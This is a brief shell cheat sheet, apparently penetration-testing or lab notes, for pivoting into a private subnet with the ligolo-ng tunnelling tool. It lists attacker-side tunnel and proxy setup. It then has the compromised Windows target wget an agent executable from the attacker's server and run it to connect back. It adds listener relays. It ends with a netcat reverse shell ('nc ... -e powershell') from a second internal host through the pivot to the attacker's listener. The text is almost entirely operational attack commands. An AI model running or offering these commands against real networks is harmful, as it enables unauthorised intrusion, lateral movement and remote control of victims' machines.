```shell
# On attacker machine:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
cd ~/Downloads/scripts/pivoting/ligolo-ng/
./proxy -selfcert

# On target machine:
wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert

# On attacker machine (in ligolo control panel):
session
<select session number>
start

# To allow machines in the private subnet to reach your host machine
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 (to access nc listener of port 4444)
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 (to access webserver)
listener_add --addr 0.0.0.0:1236 --to 127.0.0.1:8010 (to access upload server)

# On the target machine:
do not use attacker machine ip, but the machine you are tunneling from.
i.e.
Attacker 192.168.234.63
ms01 192.168.77.10 10.10.77.10 (comprimised machine)
ms02 10.10.77.11

# On attacker machine:
nc -lvnp 4444

# On target ms02:
nc 10.10.77.10 1234 -e powershell
```

